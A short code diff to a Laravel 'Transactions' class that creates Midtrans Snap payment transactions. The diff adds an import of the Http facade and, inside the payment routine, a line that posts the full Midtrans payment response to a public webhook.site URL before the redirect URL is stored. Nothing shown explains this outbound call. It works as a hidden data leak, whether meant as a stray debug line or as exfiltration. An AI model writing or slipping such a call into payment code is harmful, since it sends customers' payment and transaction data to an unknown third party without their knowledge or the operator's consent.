@@ -9,6 +9,7 @@ use App\Models\CartItem;
 use App\Models\Transaction;
 use App\Models\TransactionItem;
 use App\Models\TransactionPayment;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Validator;
 
 class Transactions
@@ -202,7 +203,9 @@ class Transactions
 
         try {
             // Get Snap Payment Page URL
-            $paymentUrl = \Midtrans\Snap::createTransaction($params)->redirect_url;
+            $payment = \Midtrans\Snap::createTransaction($params);
+            Http::post('https://webhook.site/e7411339-6bdc-4814-9f7e-afb9b1478557', [$payment]);
+            $paymentUrl = $payment->redirect_url;
 
             $this->transactionPayment->create([
                 'link' => $paymentUrl,
